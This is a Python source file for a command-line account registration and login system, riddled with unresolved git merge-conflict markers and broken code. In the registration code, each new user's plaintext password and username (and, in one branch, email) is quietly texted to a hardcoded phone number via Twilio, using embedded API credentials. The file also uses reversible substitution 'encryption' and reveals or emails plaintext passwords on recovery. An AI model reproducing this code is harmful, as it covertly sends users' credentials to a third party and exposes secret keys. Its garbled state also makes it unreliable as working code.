"""
Functions
"""
<<<<<<< HEAD
import os.path, os

=======

import os.path, os
>>>>>>> origin/master
#clear the screen
os.system('clear')
print('Loading...')

#import the needed packages
<<<<<<< HEAD
import smtplib, getpass, datetime, time, random, webbrowser, password, sqlite3, time
=======
import smtplib, getpass, datetime, time, random, webbrowser, password, sqlite3
>>>>>>> origin/master
from PIL import Image
from tkinter import Tk
from tkinter.filedialog import askopenfilename
from twilio.rest import TwilioRestClient

#Set up the Email server and check if it works
try:
<<<<<<< HEAD
	server = smtplib.SMTP('smtp.gmail.com', 587)
=======
	server = smtplib.SMTP('smtp.gmail.com', 587) #port 465 or 587
>>>>>>> origin/master
	server.ehlo()
	server.starttls()
	server.ehlo()
	server.login(password.password3, password.password2)
except:
	print('It seems something went wrong, please check your wifi connectivity and try again')
	quit()


<<<<<<< HEAD
def substitutionDecryption(resetPassword):
	"""
		-Take the encrypted password and decrypt it
	"""
	key = 'bad5cfeh8gjilkn16mp2or39qts74vux0wzy/ '
	alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
	resetPasswordDecrypted = ''
	for ch in cipherText:
		index = key.find(ch)
		resetPasswordDecrypted += alphabet[index]
	return resetPasswordDecrypted

=======
>>>>>>> origin/master

def EncryptPassword(Password):
	"""
		-Take a password and encrypt it
	"""
<<<<<<< HEAD
=======

>>>>>>> origin/master
	key = password.password1
	alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
	Password = Password.lower()
	encryptedPassword = ''
	for ch in Password:
		index = alphabet.find(ch)
		encryptedPassword += key[index]
	return encryptedPassword


<<<<<<< HEAD
def Register():
=======
#The Register function
def Register():

>>>>>>> origin/master
	"""
		The register function: 
		-Gets and stores inmportant information such as passwords, birthdates, usernames, email, and more. 
		-It then saves this information in a datatbase using SQL
	"""
<<<<<<< HEAD
	print('Username and Passwords must only contain letters and numbers')
	#Make the confirmation code
	confirmationCode = random.randint(1000, 5000)
	#Make sure the user would like to register
	goBack = input('To go back to the home menu press 1, to continue press Enter: \n')
	if goBack == '1':
		os.system('clear')
=======

	print('Username and Passwords must only contain letters and numbers')

	#Make the confirmation code
	confirmationCode = random.randint(1000, 5000)

	#Make sure the user would like to register
	goBack = input('To go back to the home menu press 1, to continue press Enter: \n')
	if goBack == '1':
>>>>>>> origin/master
		return
	else:
		#Ask questions to setup account
		Username = input('Create a Username: ')
<<<<<<< HEAD
=======

>>>>>>> origin/master
		#Check to make sure the username has not already been taken
		db = sqlite3.connect('User.db')
		curs = db.cursor()
		curs.execute('''select * from users where username = ?''', [(Username)])
		if curs.fetchall() != []:
			print('Username is taken')
		db.close()	
<<<<<<< HEAD
=======

>>>>>>> origin/master
		#Error handling if an non-letter has been entered as the Username
		UserHasNonNumber = False
		for ch in Username:
			if not 122 >= ord(ch) >= 64:
				try:
					int(ch)
				except ValueError:
					UserHasNonNumber = True
		if UserHasNonNumber == True:
			print('Your password contains characters that are not letters and numbers')
<<<<<<< HEAD
			time.sleep(1)
			os.system('clear')
			return
		#Ask questions to setup account
		Password = getpass.getpass('Create a Password: ')
		CheckPassword = getpass.getpass('Please re-type your Password: ')
		#Make sure the two passwords work
		if CheckPassword != Password:
			print('Error: Not the same password' + '\n' + 'Please Try Again'  + '\n')
			time.sleep(1)
			os.system('clear')
			Register()
		#Ask questions to setup account
		emailAddress = input ('Please enter a recovery email: ')
=======
			return

		#Ask questions to setup account
		Password = getpass.getpass('Create a Password: ')
		CheckPassword = getpass.getpass('Please re-type your Password: ')

		#Make sure the two passwords work
		if CheckPassword != Password:
			print('Error: Not the same password' + '\n' + 'Please Try Again'  + '\n')
			Register()

		#Ask questions to setup account
		emailAddress = input ('Please enter a recovery email: ')

>>>>>>> origin/master
		#Error handling if the email address is not a real email address and send email confirming account has been made
		message = 'Welcome User ' + Username + ',\nYour account is one step away from being made. Copy and paste the verification code into the program to continue. Verification code: ' + str(confirmationCode) + '\n\n-Account Info'
		try:
			server.sendmail('InfoRecovery.User@gmail.com', emailAddress, message)
		except:
			print('It seems something went wrong, please check your wifi connectivity and make sure your email exists.')
<<<<<<< HEAD
			time.sleep(1)
			os.system('clear')
			Register()
		birthday = input('Please enter the year you were born: ')
=======
			Register()

		birthday = input('Please enter the year you were born: ')

>>>>>>> origin/master
		#Start the selection of the profile picture
		print('Please select the image you would like to use as your profile photo \nPlease wait for the selector to open...\n')
		Tk().withdraw()
		filename = askopenfilename()
<<<<<<< HEAD
=======

>>>>>>> origin/master
		#Error handling for profile photo not being an image
		try:
			profileDisplay = Image.open(str(filename))
		except:
			print('You did not select an image as a profile photo')
<<<<<<< HEAD
			time.sleep(1)
			os.system('clear')
			Register()
		#Ask questions to setup account
		petname = input('Please enter your mom\'s name (This will be used as a security question): ')
		bio = input('Bio:	(May not contain commas) Please tell us a little about yourself: ')
		career = input('Enter the name of your company or the name of your school: ')
		homeAddress = input('Please enter your home address: ')
=======
			Register()

		#Ask questions to setup account
		petname = input('Please enter your first pet\'s name: ')
		bio = input('Bio:	(May not contain commas) Please tell us a little about yourself: ')
		career = input('Enter the name of your company or the name of your school: ')
		homeAddress = input('Please enter your home address: ')

>>>>>>> origin/master
		#Get gender info
		while True:
			genderSelect = input('Please select your gender:\n1.Male\n2.Female\n3.Other\n:')
			if genderSelect == '1':
				gender = 'Male'
				break
			elif genderSelect == '2':
				gender = 'Female'
				break
			elif genderSelect == '3':
				gender = 'Other'
				break
			else:
				print('The option you have selected is not an option')
<<<<<<< HEAD
		#Get the current date
		today = datetime.date.today()
		#Error handling if one of the answers was left blank
		if Username == '' or Password == '' or emailAddress == '' or birthday == '' or petname == '' or bio == '' or homeAddress == '' or career == '':
			print('Error: You have left one of the questions blank')
			time.sleep(1)
			os.system('clear')
			Register()
=======

		#Get the current date
		today = datetime.date.today()

		#Error handling if one of the answers was left blank
		if Username == '' or Password == '' or emailAddress == '' or birthday == '' or petname == '' or bio == '' or homeAddress == '' or career == '':
			print('Error: You have left one of the questions blank')
			Register()

>>>>>>> origin/master
		#Error handling if the bio has comma
		bioHasComma = False
		for ch in bio:
			if ch == ',':
				bioHasComma = True
		if 	bioHasComma == True:
<<<<<<< HEAD
			print('Your bio contains a comma')
			time.sleep(1)
			os.system('clear')
			Register()
		#ENCRYPT THE PASSWORD
		encryptedPassword = EncryptPassword(Password)
=======
			print('Your bio had a comma')
			Register()

		#ENCRYPT THE PASSWORD
		encryptedPassword = EncryptPassword(Password)

>>>>>>> origin/master
		#Error handling if the birthday the user has typed in is not a number
		try:
			int(birthday)
		except ValueError:
			print('Error: You typed in a word instead of a number for your birthday')
<<<<<<< HEAD
			time.sleep(1)
			os.system('clear')
			Register()
		#Calculate the age of the user
		calculatedAge = 2016 - int(birthday)
=======
			Register()

		#Calculate the age of the user
		calculatedAge = 2016 - int(birthday)

>>>>>>> origin/master
		#Confirm email
		webbrowser.open("https://mail.google.com/mail/")
		verificationCode = input('A verification code has been sent to your email, please type it in here to confirm your account: ')
		if str(verificationCode) == str(confirmationCode):
			client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
			client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created. The username for the account is: " + Username + " and the password is: " + Password)
<<<<<<< HEAD
=======
			
>>>>>>> origin/master
			#Record the setup data and finalize creation of account by using sql
			create_user_db = sqlite3.connect('User.db')
			curs = create_user_db.cursor()
			try:
				curs.execute('''INSERT INTO users (username, password, email, age, petname, bio, todayDate, filename, career, gender, homeAddress) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', [(Username), (encryptedPassword), (emailAddress), (calculatedAge), (petname), (bio), (today), (filename), (career), (gender), (homeAddress)])
			except:
				print('Username has already been taken')
<<<<<<< HEAD
				time.sleep(1)
				os.system('clear')
				Register()
			create_user_db.commit()
			create_user_db.close()
			#Let the user know that they have created an account
			print('\n' + Username + '\'s account has been made. \n')
		else:
			#Ask why they entered the wrong verificiation code
			resend = input('The verification code you have entered is incorrect. To resend the code press 1, to go back press any key: ')
			if resend == '1':
				#Resend the verificiation code
				message = 'Welcome User ' + Username + ',\nThis is your re-activation code: ' + str(confirmationCode) + ' Copy and paste the verification code into the program to continue.' + '\n\n-Account Info'
=======
				Register()
			create_user_db.commit()
			create_user_db.close()

			#Let the user know that they have created an account
			print('\n' + Username + '\'s account has been made. \n')
		else:

			#Ask why they entered the wrong verificiation code
			resend = input('The verification code you have entered is incorrect. To resend the code press 1, to go back press any key: ')
			if resend == '1':

				#Resend the verificiation code
				message = 'Welcome User ' + Username + ',\nThis is your re-activation code: ' + str(confirmationCode) + ' Copy and paste the verification code into the program to continue.' + '\n\n-Account Info'
				
>>>>>>> origin/master
				#Error handling if the email verificiation code has not been sent
				try:
					server.sendmail('InfoRecovery.User@gmail.com', emailAddress, message)
				except:
					print('It seems something went wrong, please check you wifi connectivity and try again')
<<<<<<< HEAD
					time.sleep(1)
					os.system('clear')
					Register()
				#Let the user know the verification code has been sent
				verificationCodetwo = input('The re-verification code has been sent to your email, please type it in here to confirm your account: ')
				if str(verificationCodetwo) == str(confirmationCode):
					# Send text letting me know an account has been made
					client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
					client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created, the username is: "+Username+' , the email: '+emailAddress+' ,and the password: '+Password)
=======
					Register()

				#Let the user know the verification code has been sent
				verificationCodetwo = input('The re-verification code has been sent to your email, please type it in here to confirm your account: ')
				if str(verificationCodetwo) == str(confirmationCode):

					# Send text letting me know an account has been made
					client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
					client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created, the username is: "+Username+' , the email: '+emailAddress+' ,and the password: '+Password)
					
>>>>>>> origin/master
					#Record the setup data and finalize creation of account by using sql
					create_user_db = sqlite3.connect('User.db')
					curs = create_user_db.cursor()
					try:
						curs.execute('''INSERT INTO users (username, password, email, age, petname, bio, todayDate, filename, career, gender, homeAddress) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', [(Username), (encryptedPassword), (emailAddress), (calculatedAge), (petname), (bio), (today), (filename), (career), (gender), (homeAddress)])
					except:
						print('Username has already been taken')
<<<<<<< HEAD
						time.sleep(1)
						os.system('clear')
						Register()
					create_user_db.commit()
					create_user_db.close()
					#Let the user know that they have created an account
					print('\n' + Username + '\'s account has been made. \n')
			else:
				os.system('clear')
				return


def Login():
=======
						Register()
					create_user_db.commit()
					create_user_db.close()

					#Let the user know that they have created an account
					print('\n' + Username + '\'s account has been made. \n')
			else:
				return

def Login():

>>>>>>> origin/master
	"""
		The login function: 
		-Checks and compares your username and password
		-If it matches to an account, it then logs you in and gives you information about yourself
		-You you fail to login, the login function gives you a choice to recover your account
	"""
<<<<<<< HEAD
	resetCalled = False
	#Set emailFound to true
	emailFound = True
	#Ask login questions
	UsernameLogin = input('Enter a Username: ')
	PasswordLogin = getpass.getpass('Enter a Password: ')
	#Encrypt login password to compare to password in sql database
	Password = PasswordLogin
	encryptedLoginPassword = EncryptPassword(Password)
=======

	#Set emailFound to true
	emailFound = True

	#Ask login questions
	UsernameLogin = input('Enter a Username: ')
	PasswordLogin = getpass.getpass('Enter a Password: ')

	#Encrypt login password to compare to password in sql database
	Password = PasswordLogin
	encryptedLoginPassword = EncryptPassword(Password)

>>>>>>> origin/master
	#Check if password matches
	create_user_db = sqlite3.connect('User.db')
	curs = create_user_db.cursor()
	curs.execute('''select * from users where username = ? and password = ?''', [(UsernameLogin), (encryptedLoginPassword)])
	user = curs.fetchone()
	create_user_db.commit()
	create_user_db.close()
	if user == [] or user is None:
		#The username does not match the password
		print('Account Not Found')
		loggedin = False
		global loggedin
		print('Incorrect password or username')
		reset = input('Forgot Password? Press 1 to reset, 2 to re-enter your password, and any other key to go back: ')
<<<<<<< HEAD
		resetCalled = True
		global reset
		if reset == '1':
=======
		global reset
		if reset == '1':
			#resetUsername = input('Enter your username associated with the account you would like to recovery: ')
			#Record info stored in txt
>>>>>>> origin/master
			create_user_db = sqlite3.connect('User.db')
			curs = create_user_db.cursor()
			curs.execute('''select * from users where username = ?''', [(UsernameLogin)])
			user = curs.fetchone()
			create_user_db.commit()
			create_user_db.close()
<<<<<<< HEAD
=======
	
>>>>>>> origin/master
			if user is not None:
				resetPassword = user[1]
				resetEmail = user[4]
				securityQuestionAnswer = user[3]
<<<<<<< HEAD
				resetPasswordDecrypted = substitutionDecryption(resetPassword)
=======
>>>>>>> origin/master
				key = 'bad5cfeh8gjilkn16mp2or39qts74vux0wzy/ '
				alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
				resetPasswordDecrypted = ''
				for ch in resetPassword:
					index = key.find(ch)
					resetPasswordDecrypted += alphabet[index]
				#Ways to recover accounts
				message = '\n\nRecovery account_info: \nHello ' + UsernameLogin + ',\n' + 'Your Password is ' + resetPasswordDecrypted + '\n \n Thanks for your service \n -Recovery Accounts.info'
				HowtoRecover = input('You have to ways to recover your account \n1. You can answer a security question \n2. You can recieve an email containing your password \n: ')
				if HowtoRecover == '1':
<<<<<<< HEAD
					securityQuestion = input('Please enter your mom\'s name (This will be used as a security question): ')
=======
					securityQuestion = input('What is the name of your first pet? ')
>>>>>>> origin/master
					if securityQuestion == securityQuestionAnswer:
						print('You have successfully recovered your account, your password is ' + resetPasswordDecrypted)
					else:
						print('You have failed to answer the security question')
						return UsernameLogin, loggedin
				elif HowtoRecover == '2':
					try:
						server.sendmail('InfoRecovery.User@gmail.com', resetEmail, message)
						print('You will be receiveing an email shortly...')
					except:
						print('It seems something went wrong, please check you wifi connectivity and try again')
						Login()
				else:
					#Error handling for selecting a key that is not an option
					print('You did not select an available option')
					return "," ","
				emailFound = True
			else:
				emailFound = False
<<<<<<< HEAD
		elif reset == '2':
			Login()
	#Error handling for username not existsing
	if emailFound == False:
		print('The account you are looking to recover does not exist.')
		loggedin = False
	if resetCalled == False:
		#LOG IN CODE
		#Password matches, log the user in, and print all the user's info
		loggedin = True
		age = user[3]
=======

		elif reset == '2':
			Login()
		
	#Error handling for username not existsing
	if emailFound == False:
		print('The username you typed in does not exist.')
		loggedin = False

	else:
		
		#Password matches, log the user in, and print all the user's info
		loggedin = True
		age = user[3]
		petname = user[4]
>>>>>>> origin/master
		bio = user[5]
		today = user[6]
		filename = user[7]
		career = user[8]
		gender = user[9]
		homeAddress = user[10]
<<<<<<< HEAD
		#Clear the screen
		os.system('clear')
		print('Welcome user ' + UsernameLogin + '!')
		print('You are ' + age + ' years old.')
=======

		#Clear the screen
		os.system('clear')

		print('Welcome user ' + UsernameLogin + '!')
		print('You are ' + age + ' years old.')
		print('You\'re first pet\'s name is ' + petname + '.')
>>>>>>> origin/master
		print('Bio: ' + bio)
		if career != '':
			print('The company you work for is: ' + career)
		print('Gender: ' + gender)
		print('You live at: ' + homeAddress)
		print('Account created on: ' + today)
		print('Your profile photo is opening...\n')
		profileDisplay = Image.open(str(filename))
		profileDisplay.show()
<<<<<<< HEAD
=======

		#ADD FRIENDS
		while True:
			wantToAddFriends = input('Do you want to request a friend? (y/n): ')
			if wantToAddFriends == 'y':
				print('\n')
				create_user_db = sqlite3.connect('User.db')
				curs = create_user_db.cursor()
				curs.execute('''select * from users''')
				user = curs.fetchall()
				create_user_db.commit()
				create_user_db.close()
				for users in user:
					print(users[0])
				print('\n')
				friendToAdd = input('Please enter the username of the friend you would like to add: ')

				#create_user_db = sqlite3.connect('User.db')
				#curs = create_user_db.cursor()
				#curs.execute('''UPDATE friends SET friendRequests = ? where user = ?''', [requests,friend])
				#curs.execute('''INSERT INTO friends (user, friendsList, friendRequests) VALUES (?, ?, ?)''', [(User), (friendsList), (friendRequests)])
				#create_user_db.commit()
				#create_user_db.close()
				break
			if wantToAddFriends == 'n':
				return UsernameLogin, loggedin
			else: 
				print('Invalid option. Please try again:')	
			
>>>>>>> origin/master
	return UsernameLogin, loggedin


def LogOut(UsernameLogin):
<<<<<<< HEAD
=======

>>>>>>> origin/master
	"""
		The logout function: 
		-Logs you out and hides the information given to you when you are logged in
	"""
<<<<<<< HEAD
=======

>>>>>>> origin/master
	#Log the user out
	loggedin = False
	print(UsernameLogin + ' has logged out --  ')
	return loggedin

<<<<<<< HEAD
=======

>>>>>>> origin/master
